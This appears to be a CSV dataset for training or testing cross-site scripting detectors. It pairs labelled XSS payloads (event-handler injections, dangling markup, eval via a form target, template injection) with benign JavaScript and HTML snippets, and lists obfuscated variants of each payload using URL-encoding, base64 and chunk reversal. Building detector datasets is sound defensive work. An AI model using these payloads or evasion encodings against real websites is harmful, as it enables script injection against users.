sample_id,label,payload_original,payload_obfuscated,generator,recipe
46,1,"<blockquote ondblclick=""alert(1)"">test</blockquote>",%3Cblockquote%20ondblclick%3D%22alert%281%29%22%3Etest%3C%2Fblockquote%3E,llm_style_t1.0,urlencode
47,1,"<div draggable=""true"" contenteditable>drag me</div><blockquote ondragover=alert(1) contenteditable>drop here</blockquote>",">ockquotehere</blle>drop nteditab1) conter=alert(ndragovekquote oiv><blocag me</dtable>drntenteditrue"" coggable=""<div dra",llm_style_t1.0,reverse_chunks
48,1,"<menu oncopy=""alert(1)"" contenteditable>test</menu>",%25253Cmenu%252520oncopy%25253D%252520%252520%252522alert%252528%2525201%252529%252522%252520contenteditable%25253E%252520%252520test%25253C%252520%25252Fmenu%25253E,llm_style_t1.0,whitespace_noise+double_urlencode+urlencode
49,0,index_js.execute(callback); return; },index_js.execute(callback); return; },llm_style_t1.0,none
50,1,<body onfocusout=alert(1) id=x><iframe id=x>,PGJvZHkgb25mb2N1c291dD1hbGVydCgxKSBpZD14PjxpZnJhbWUgaWQ9eD4%3D,llm_style_t1.0,base64+urlencode
51,0,value: function _handletargetclick(e) { this.open(); },value: function _handletargetclick(e) { this.open(); },llm_style_t1.0,none
52,1,"<command onbeforecut=""alert(1)"" contenteditable>test</command>",%3Ccommand%20onbeforecut%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fcommand%3E,llm_style_t1.0,urlencode
53,1,"<li onmouseup=""alert(1)"">test</li>",%253Cli%2520onmouseup%253D%2522alert%25281%2529%2522%253Etest%253C%252Fli%253E,llm_style_t1.0,double_urlencode+whitespace_noise
54,0,if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,if ($textarea[0].offsetwidth > 0 && $textarea[0].offsetheight > 0) {,llm_style_t1.0,none
55,1,"<embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=""",&lt;embed src=http://subdomain1.portswigger-labs.net/dangling_markup/name.html name=&quot;,llm_style_t1.0,html_entities
56,0,} }); var camelcase = (function () {,} }); var camelcase = (function () {,llm_style_t1.0,none
57,0,"}; var carousel = function (_component18) { _inherits(carousel, _component18);","}; var carousel = function (_component18) { _inherits(carousel, _component18);",llm_style_t1.0,none
58,1,<figcaption onpointerup=alert(1)>xss</figcaption>,%253Cfigcaption%2520onpointerup%253Dalert%25281%2529%253Exss%253C%252Ffigcaption%253E,llm_style_t1.0,double_urlencode
59,0,"}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];","}, dddd: () => { return this.options.i18n.weekdays[this.date.getday()];",llm_style_t1.0,none
60,0,let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,let taptargettexttop = istop ? taptargetheight / 2 : 0; let taptargettextbottom = 0; let taptargettextleft = isleft && !iscenterx ? taptargetwidth / 2 - originwidth : 0;,llm_style_t1.0,none
61,1,"<title onkeyup=""alert(1)"" contenteditable>test</title>","itle>st</tle>teditabtente"" conrt(1)=""alekeyuple on< tit",llm_style_t1.0,whitespace_noise+reverse_chunks+comment_marker
62,0,"top: [this.options.endingtop, this.options.startingtop],","top: [this.options.endingtop, this.options.startingtop],",llm_style_t1.0,none
63,0,} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,} const activeindex = this._getitemindex(this._getactive()) if (activeindex === index) {,llm_style_t1.0,none
64,0,value: function _handlefabclick() { if (this.isopen) { this.close();,value: function _handlefabclick() { if (this.isopen) { this.close();,llm_style_t1.0,none
65,0,"e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);","e.preventdefault(); document.removeeventlistener('mouseup', this._handledocumentclickendbound); document.removeeventlistener('touchend', this._handledocumentclickendbound);",llm_style_t1.0,none
66,1,"<dd onmouseleave=""alert(1)"">test</dd>","<dd onmouseleave=""alert(1)"">test</dd>",llm_style_t1.0,comment_marker
67,1,"<style onkeydown=""alert(1)"" contenteditable>test</style>",%253Cstyle%2520onkeydown%253D%2522alert%25281%2529%2522%2520contenteditable%253Etest%253C%252Fstyle%253E,llm_style_t1.0,double_urlencode
68,0,"} _handlecarouseldrag(e) { let x, y, delta, deltay;","} _handlecarouseldrag(e) { let x, y, delta, deltay;",llm_style_t1.0,none
69,0,var clickpos = timepicker._pos(e),var clickpos = timepicker._pos(e),llm_style_t1.0,none
70,0,"<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>","<li><a href=""#citerefnilsson1998"">nilsson 1998 </a>, chpt. 13–16 </li> </ul>",llm_style_t1.0,none
71,0,"this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {","this.el.removeeventlistener('mouseleave', this._handlemouseleavebound); this.dropdownel.removeeventlistener('mouseleave', this._handlemouseleavebound); } else {",llm_style_t1.0,none
72,1,<svg><animate onend=alert(1) attributename=x dur=1s>,PHN2Zz48YW5pbWF0ZSBvbmVuZD1hbGVydCgxKSBhdHRyaWJ1dGVuYW1lPXggZHVyPTFzPg==,llm_style_t1.0,base64
73,1,<th id=x tabindex=1 onfocus=alert(1)></th>,%253Cth%2520id%253Dx%2520tabindex%253D1%2520onfocus%253Dalert%25281%2529%253E%253C%252Fth%253E,llm_style_t1.0,double_urlencode
74,0,if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },if (!hrefattribute || !hrefattribute.includes('#') && !hrefattribute.startswith('.')) { return null; },llm_style_t1.0,none
75,1,<big onpointermove=alert(1)>xss</big>,PGJpZyBvbnBvaW50ZXJtb3ZlPWFsZXJ0KDEpPnhzczwvYmlnPg%253D%253D,llm_style_t1.0,base64+double_urlencode
76,1,"<div draggable=""true"" contenteditable>drag me</div><dl ondragover=alert(1) contenteditable>drop here</dl>",%3Cdiv%20draggable%3D%22true%22%20contenteditable%3Edrag%20me%3C%2Fdiv%3E%3Cdl%20ondragover%3Dalert%281%29%20contenteditable%3Edrop%20here%3C%2Fdl%3E,llm_style_t1.0,urlencode
77,0,if ( value >= xval.slice(-1)[0] ){ return 100; },if ( value >= xval.slice(-1)[0] ){ return 100; },llm_style_t1.0,none
78,0,for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,for (let c = 0; c < 1; c++) { this._renderdatedisplay(); html +=,llm_style_t1.0,none
79,1,<wbr onblur=alert(1) tabindex=1 id=x></wbr><input autofocus>,s%3Eautofocuinput%20br%3E%3CE%3C%2Fwid%3Dx%3x%3D1%200tabinde281%29%23Dalert%0onblur%%3Cwbr%2,llm_style_t1.0,urlencode+reverse_chunks
80,0,"} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);","} if ( lookforward && handlenumber < scope_handles.length - 1 ) { to = math.min(to, reference[handlenumber + 1] - options.margin);",llm_style_t1.0,none
81,0,config.parent = index_js.getelement(config.parent); return config; },config.parent = index_js.getelement(config.parent); return config; },llm_style_t1.0,none
82,0,"<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>","<li id=""cite_note-footnoterussellnorvig200916-30""><span class=""mw-cite-backlink""><b><a href=""#cite_ref-footnoterussellnorvig200916_30-0"">^ </a> </b>",llm_style_t1.0,none
83,0,"scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],","scale: [0.4, 1], translatey: [this.offsety, 0], translatex: [this.offsetx, 0],",llm_style_t1.0,none
84,0,"<h4><span class=""mw-headline"" id=""logic-based"">logic-based","<h4><span class=""mw-headline"" id=""logic-based"">logic-based",llm_style_t1.0,none
85,1,"<style>@keyframes x{}</style><svg style=""animation-name:x"" onanimationstart=""alert(1)""></svg>",%25253Cstyle%25253E%252540keyframes%252520x%25257B%25257D%25253C%25252Fstyle%25253E%25253Csvg%252520style%25253D%252522animation-name%25253Ax%252522%252520onanimationstart%25253D%252522alert%2525281%252529%252522%25253E%25253C%25252Fsvg%25253E,llm_style_t1.0,double_urlencode+urlencode
86,1,"<area oncopy=""alert(1)"" contenteditable>test</area>",%26lt%3Barea%20oncopy%3D%26quot%3Balert%281%29%26quot%3B%20contenteditable%26gt%3Btest%26lt%3B%2Farea%26gt%3B,llm_style_t1.0,whitespace_noise+html_then_urlencode
87,0,const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,const event_hide = `hide${event_key}` const event_hidden = `hidden${event_key}` const event_show = `show${event_key}`,llm_style_t1.0,none
88,1,"<button onbeforecopy=""alert(1)"" contenteditable>test</button>",%3Cbutton%20onbeforecopy%3D%22alert%281%29%22%20contenteditable%3Etest%3C%2Fbutton%3E,llm_style_t1.0,urlencode+html_entities
89,0,previous = previous.previouselementsibling } return [],previous = previous.previouselementsibling } return [],llm_style_t1.0,none
90,0,"} form.classlist.add('was-validated') }, false)","} form.classlist.add('was-validated') }, false)",llm_style_t1.0,none
91,1,"<style>:target {color: red;}</style><th id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></th>","<style>:target/*OBF*/ {color: red;}</style><th id=x style=""transition:color 10s"" ontransit/*OBF*/ion/*OBF*/cancel=alert(1)></th>",llm_style_t1.0,comment_marker
92,1,"<optgroup onbeforepaste=""alert(1)"" contenteditable>test</optgroup>",PG9wdGdyb3VwIG9uYmVmb3JlcGFzdGU9ImFsZXJ0KDEpIiBjb250ZW50ZWRpdGFibGU+dGVzdDwvb3B0Z3JvdXA+,llm_style_t1.0,base64
93,0,var ownelement = getwindow(node).element,var ownelement = getwindow(node).element,llm_style_t1.0,none
94,1,<object onpointerout=alert(1)>xss</object>,PG9iamVjdCBvbnBvaW50ZXJvdXQ9YWxlcnQoMSk+eHNzPC9vYmplY3Q+,llm_style_t1.0,base64
95,0,this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),this._handlerangemouseuptouchendbound = this._handlerangemouseuptouchend.bind(this),llm_style_t1.0,none
96,1,<x @[_b.constructor`alert(1)`()]>,<x @[_b.constructor`alert(1)  `()]>,llm_style_t1.0,whitespace_noise
97,0,return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,return order === order_prev ? direction_right : direction_left; } static jqueryinterface(config) {,llm_style_t1.0,none
98,0,"<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>","<li><a href=""/wiki/list_of_artificial_intelligence_projects"" title=""list of artificial intelligence projects"">projects </a> </li>",llm_style_t1.0,none
99,0,"<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:","<a href=""/wiki/applied_information_economics"" title=""applied information economics"">information value theory </a>:",llm_style_t1.0,none
100,0,"<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august","<li><cite id=""citerefacm1998"" class=""citation web""><a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20071012025921/http://www.acm.org/class/1998/i.2.html"">""acm computing classification system: artificial intelligence"" </a>. <a href=""/wiki/association_for_computing_machinery"" title=""association for computing machinery"">acm </a>. 1998. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.acm.org/class/1998/i.2.html"">the original </a> on 12 october 2007<span class=""reference-accessdate"">. retrieved <span class=""nowrap"">30 august",llm_style_t1.0,none
101,0,"<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">","<li><cite id=""citerefdowehajek1997"" class=""citation journal"">dowe, d. l.; hajek, a. r. (1997). <a rel=""nofollow"" class=""external text"" href=""https://web.archive.org/web/20110628194905/http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">""a computational extension to the turing test"" </a>. <i>proceedings of the 4th conference of the australasian cognitive science society </i>. archived from <a rel=""nofollow"" class=""external text"" href=""http://www.csse.monash.edu.au/publications/1997/tr-cs97-322-abs.html"">the original </a> on 28 june 2011. </cite><span title=""ctx_ver=z39.88-2004&amp;rft_val_fmt=info%3aofi%2ffmt%3akev%3amtx%3ajournal&amp;rft.genre=article&amp;rft.jtitle=proceedings+of+the+4th+conference+of+the+australasian+cognitive+science+society&amp;rft.atitle=a+computational+extension+to+the+turing+test&amp;rft.date=1997&amp;rft.aulast=dowe&amp;rft.aufirst=d.+l.&amp;rft.au=hajek%2c+a.+r.&amp;rft_id=http%3a%2f%2fwww.csse.monash.edu.au%2fpublications%2f1997%2ftr-cs97-322-abs.html&amp;rfr_id=info%3asid%2fen.wikipedia.org%3aartificial+intelligence"" class=""z3988"">",llm_style_t1.0,none
102,1,"<area onmouseover=""alert(1)"">test</area>","<area onmouseover=""alert/*OBF*/(1)"">test</area>",llm_style_t1.0,comment_marker
103,0,"return eventend(event, data)","return eventend(event, data)",llm_style_t1.0,none
104,0,"1 ), visibledate = date.gettime();","1 ), visibledate = date.gettime();",llm_style_t1.0,none
105,0,} _getoffset() { const { offset } = this._config,} _getoffset() { const { offset } = this._config,llm_style_t1.0,none
106,1,"<form action=""http://subdomain1.portswigger-labs.net/xss/xss.php"" target=""alert(1)""><input type=hidden name=x value=""';eval(name)//""><input type=hidden name=context value=js_string_single><input type=""submit"" value=""xss via target in a form""></form>",%3Cform%20action%3D%22http%3A%2F%2Fsubdomain1.portswigger-labs.net%2Fxss%2Fxss.php%22%20target%3D%22alert%281%29%22%3E%3Cinput%20type%3Dhidden%20name%3Dx%20value%3D%22%27%3Beval%28name%29%2F%2F%22%3E%3Cinput%20type%3Dhidden%20name%3Dcontext%20value%3Djs_string_single%3E%3Cinput%20type%3D%22submit%22%20value%3D%22xss%20via%20target%20in%20a%20form%22%3E%3C%2Fform%3E,llm_style_t1.0,urlencode
107,1,"<sup onbeforecopy=""alert(1)"" contenteditable>test</sup>",&lt;  sup onbeforecopy=&quot;alert(1)&quot; contenteditable&gt;test&lt;/sup&gt;,llm_style_t1.0,whitespace_noise+html_entities
108,0,} _animatein() { this._positiontooltip();,} _animatein() { this._positiontooltip();,llm_style_t1.0,none
